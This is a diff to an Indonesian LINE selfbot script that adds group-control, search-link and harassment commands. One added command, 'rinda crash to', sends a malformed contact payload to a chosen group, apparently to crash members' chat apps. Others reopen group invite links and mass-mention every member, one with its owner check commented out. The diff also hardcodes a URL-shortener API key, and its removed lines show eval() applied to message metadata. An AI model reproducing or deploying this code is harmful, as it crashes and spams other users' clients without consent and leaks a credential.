@@ -408,7 +408,7 @@ def clientBot(op):
                                 client.sendMessage(to, "The result is {} ms".format(str(speed(ping))))
                                 
                             elif cmd == "sp2":
-                              if msg._from in Owner:
+                              if msg._from in owner:
                                 start = time.time()
                                 client.sendMessage(to, "...")
                                 elapsed_time = time.time() - start
@@ -743,7 +743,7 @@ def clientBot(op):
                                     else:
                                         group.preventedJoinByTicket = False
                                         client.updateGroup(group)
-                                        client.sendMessage(to, "Successfully membuka grup qr")
+                                        client.sendMessage(to, "Berhasil membuka grup qr")
                             elif cmd == 'groupticket off':
                                 if msg.toType == 2:
                                     group = client.getGroup(to)
@@ -752,7 +752,7 @@ def clientBot(op):
                                     else:
                                         group.preventedJoinByTicket = True
                                         client.updateGroup(group)
-                                        client.sendMessage(to, "Failed menutup grup qr")
+                                        client.sendMessage(to, "Berhasil menutup grup qr")
                             elif cmd == 'groupinfo':
                                 group = client.getGroup(to)
                                 try:
@@ -932,7 +932,7 @@ def clientBot(op):
                                 groups = client.groups
                                 for group in groups:
                                     client.sendMessage(group, "[ Broadcast ]\n{}".format(str(txt)))
-                                    client.sendMessage(to, "Berhasil broadcast ke {} group".format(str(len(groups))))                                    
+                                    client.sendMessage(to, "Berhasil broadcast ke {} group".format(str(len(groups))))
                                     
                             elif cmd == "lurking":
                                 tz = pytz.timezone("Asia/Makassar")
@@ -977,56 +977,6 @@ def clientBot(op):
                                     pass
                                 else:
                                     client.sendMessage(receiver,"Lurking is nonactive\n\nType *lurking on* for actived a lurkmode!")
-                            elif cmd.startswith("mimicadd"):
-                                targets = []
-                                key = eval(msg.contentMetadata["MENTION"])
-                                key["MENTIONEES"][0]["M"]
-                                for x in key["MENTIONEES"]:
-                                    targets.append(x["M"])
-                                for target in targets:
-                                    try:
-                                        settings["mimic"]["target"][target] = True
-                                        client.sendMessage(msg.to,"Target ditambahkan!")
-                                        break
-                                    except:
-                                        client.sendMessage(msg.to,"Gagal menambahkan target")
-                                        break
-                            elif cmd.startswith("mimicdel"):
-                                targets = []
-                                key = eval(msg.contentMetadata["MENTION"])
-                                key["MENTIONEES"][0]["M"]
-                                for x in key["MENTIONEES"]:
-                                    targets.append(x["M"])
-                                for target in targets:
-                                    try:
-                                        del settings["mimic"]["target"][target]
-                                        client.sendMessage(msg.to,"Target dihapuskan!")
-                                        break
-                                    except:
-                                        client.sendMessage(msg.to,"Gagal menghapus target")
-                                        break
-                                    
-                            elif cmd == "mimiclist":
-                                if settings["mimic"]["target"] == {}:
-                                    client.sendMessage(msg.to,"Tidak Ada Target")
-                                else:
-                                    mc = "╔══[ Mimic List ]"
-                                    for mi_d in settings["mimic"]["target"]:
-                                        mc += "\n╠ "+client.getContact(mi_d).displayName
-                                    mc += "\n╚══[ Finish ]"
-                                    client.sendMessage(msg.to,mc)
-                                
-                            elif cmd.startswith("mimic"):
-                                sep = text.split(" ")
-                                mic = text.replace(sep[0] + " ","")
-                                if mic == "on":
-                                    if settings["mimic"]["status"] == False:
-                                        settings["mimic"]["status"] = True
-                                        client.sendMessage(msg.to,"Reply Message on")
-                                elif mic == "off":
-                                    if settings["mimic"]["status"] == True:
-                                        settings["mimic"]["status"] = False
-                                        client.sendMessage(msg.to,"Reply Message off")
 # Pembatas Script #   
                             elif cmd.startswith("checkwebsite"):
                                 try:
@@ -1335,17 +1285,135 @@ def clientBot(op):
                                 #client.getGroupIdsJoined()
                                 client.leaveGroup(to)                                    
 
+                            elif cmd.startswith("rinda tutupqr to"):
+                              if msg._from in admin:
+                                number = cmd.replace("rinda tutupqr to","")
+                                groups = client.getGroupIdsJoined()
+                                try:
+                                    group = groups[int(number)-1]
+                                    G = client.getGroup(group)
+                                    try:
+                                        G.preventedJoinByTicket = True
+                                        client.updateGroup(G)
+                                    except:
+                                        G.preventedJoinByTicket = True
+                                        client.updateGroup(G)
+                                    client.sendMessage(to, " 「 Close Qr 」 InGroup : " + G.name)
+                                except Exception as error:
+                                    client.sendMessage(to, str(error))
+                  
+                            elif cmd.startswith("rinda bukaqr to"):
+                              if msg._from in admin:
+                                number = cmd.replace("rinda bukaqr to","")
+                                groups = client.getGroupIdsJoined()
+                                try:
+                                    group = groups[int(number)-1]
+                                    G = client.getGroup(group)
+                                    try:
+                                        G.preventedJoinByTicket = False
+                                        client.updateGroup(G)
+                                        gurl = "https://line.me/R/ti/g/{}".format(str(client.reissueGroupTicket(G.id)))
+                                    except:
+                                        G.preventedJoinByTicket = False
+                                        client.updateGroup(G)
+                                        gurl = "https://line.me/R/ti/g/{}".format(str(client.reissueGroupTicket(G.id)))
+                                    client.sendMessage(to, " 「 Close Qr 」 InGroup : " + G.name + "\n  Url : " + gurl)
+                                except Exception as error:
+                                    client.sendMessage(to, str(error))
+                  
+                            elif cmd.startswith("rinda mention to"):
+                              #if msg._from in Owner:
+                                number = cmd.replace("rinda mention to","")
+                                groups = client.getGroupIdsJoined()
+                                try:
+                                    group = groups[int(number)-1]
+                                    G = client.getGroup(group)
+                                    try:
+                                        contact = [mem.mid for mem in G.members]
+                                        text = "Mentioning To %i Members\n" %len(contact)
+                                        no = 1
+                                        for mid in contact:
+                                            text += "\n{}. @!           ".format(str(no))
+                                            no = (no+1)
+                                        text += "\n\nInGroup : {}".format(str(G.name))
+                                        sendMention(group, text, contact)
+                                    except:
+                                        contact = [mem.mid for mem in G.members]
+                                        text = "Mentioning To %i Members\n" %len(contact)
+                                        no = 1
+                                        for mid in contact:
+                                            text += "\n{}. @!           ".format(str(no))
+                                            no = (no+1)
+                                        text += "\n\nInGroup : {}".format(str(G.name))
+                                        sendMention(group, text, contact)
+                                    client.sendMessage(to, "Send Mention To Group : " + G.name)
+                                except Exception as error:
+                                    client.sendMessage(to, str(error))
+
+                            elif cmd.startswith("rinda crash to"):
+                              if msg._from in admin:
+                                number = cmd.replace("rinda crash to","")
+                                groups = client.getGroupIdsJoined()
+                                try:
+                                    group = groups[int(number)-1]
+                                    G = client.getGroup(group)
+                                    try:
+                                        client.sendContact(group, "uc7d319b7d2d38c35ef2b808e3a2aeed9',")
+                                    except:
+                                        client.sendContact(group, "uc7d319b7d2d38c35ef2b808e3a2aeed9',")
+                                    client.sendMessage(to, "Sending Crash To Group : " + G.name)
+                                except Exception as error:
+                                    client.sendMessage(to, str(error))
+
+                            elif cmd.startswith("github "):
+                                query = cmd.replace("github ","")
+                                b = urllib.parse.quote(query)
+                                #client.sendMessage(to,"「 Searching 」\n" "Type: GitHub Search\nStatus: Processing...")
+                                client.sendMessage(to, " " + a + "\nhttps://github.com/search?utf8=✓&q="+query)
+                                
+                            elif cmd.startswith("playstore "):
+                                query = cmd.replace("playstore ","")
+                                client.sendMessage(to, "「 Searched : "+query+"」\nhttps://play.google.com/store/search?q="+query)
+                  
+                            elif cmd.startswith("twitter "):
+                                query = cmd.replace("twitter ","")
+                                b = urllib.parse.quote(query)
+                                #client.sendMessage(to,"「 Searching 」\n" "Type:Search Info\nStatus: Processing")
+                                client.sendMessage(to, "https://www.twitter.com/"+query)
+                                #client.sendMessage(to,"「 Searching 」\n" "Type:Search Info\nStatus: Success")
+                  
+                            elif cmd.startswith("smule "):
+                                query = cmd.replace("smule ","")
+                                b = urllib.parse.quote(query)
+                                #client.sendMessage(to,"Searching to id smule..")
+                                client.sendMessage(to, "Name : "+b+"\nId smule : http://smule.com/"+query)
+
+                            elif cmd.startswith("asking "):
+                                query = cmd.replace("asking ","")
+                                #kata = cmd.replace("asking ", "")
+                                sch = query.replace(" ","+")
+                                with requests.session() as web:
+                                   urlz = "http://lmgtfy.com/?q={}".format(str(sch))
+                                   r = web.get("http://tiny-url.info/api/v1/create?apikey=A942F93B8B88C698786A&provider=cut_by&format=json&url={}".format(str(urlz)))
+                                   data = r.text
+                                   data = json.loads(data)
+                                   url = data["shorturl"]
+                                   ret_ = "\n"
+                                   ret_ += " 「 Link : {}".format(str(url) + " 」")
+                                   #client.sendMessage(to, str(ret_))
+                                   client.sendMessage(msg.to, "「 Question is *" + query + "* 」  " + str(ret_))
+
                             elif cmd.startswith("rinda get wikipedia "):
                                 query = cmd.replace("rinda get wikipedia ","")
                                 try:
                                     sep = msg.text.split(" ")
                                     wiki = msg.text.replace(sep[0] + " ","")
                                     wikipedia.set_lang("id")
-                                    pesan=" 「Judul」 "
+                                    pesan=" 「 Judul 」 "
                                     pesan+=wikipedia.page(wiki).title
-                                    pesan+="\n 「Teks」 "
+                                    pesan+="\n 「 Teks 」 "
                                     pesan+=wikipedia.summary(wiki, sentences=1)
-                                    pesan+="\n 「Alamat url」 "+wikipedia.page(wiki).url
+                                    pesan+="\n 「 Alamat url 」 "+wikipedia.page(wiki).url
                                     pesan+="\n"
                                     client.sendMessage(to, pesan)
                                 except:
@@ -1443,14 +1511,7 @@ def clientBot(op):
                                 bb = a.contents
                                 cc = bb.link
                                 textt = bb.text
-                                client.sendMessage(receiver, 'Link: ' + str(cc) + '\nText: ' + str(textt) + '\nMaker: ' + str(aa))                                
-                        if text.lower() == "token done":
-                            tknop= codecs.open("tkn.json","r","utf-8")
-                            tkn = json.load(tknop)
-                            a = ['{}'.format(msg._from)][0]['tkn']
-                            req = requests.get(url = '{}'.format(a))
-                            b = req.text
-                            client.sendMessage(msg.to, '{}'.format(b))                                    
+                                client.sendMessage(receiver, 'Link: ' + str(cc) + '\nText: ' + str(textt) + '\nMaker: ' + str(aa))
                         elif text.lower() == "setkey on":
                             settings["setKey"] = True
                             client.sendMessage(to, "Berhasil mengaktifkan setkey")
